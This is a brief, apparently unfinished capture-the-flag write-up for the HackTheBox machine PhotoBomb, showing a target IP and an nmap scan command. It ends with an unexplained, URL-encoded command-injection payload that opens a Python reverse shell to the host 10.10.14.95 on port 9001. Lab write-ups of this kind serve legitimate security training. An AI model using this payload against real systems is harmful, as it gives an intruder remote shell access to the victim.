# HackTheBox PhotoBomb WriteUp

![Ping](images/photobomb.png?raw=true "Photobomb")


Machine IP: 10.10.11.182

![Ping](images/img(1).png?raw=true "Ping")

<br/>

### -> NMAP SCAN

```
sudo nmap -vvv -cSV -p0-65535 --reason -T4 10.10.11.182 -oN photobomb.nmap
```

![Ping](images/img(2).png?raw=true "Ping")

%3bexport+RHOST%3d"10.10.14.95"%3bexport+RPORT%3d9001%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'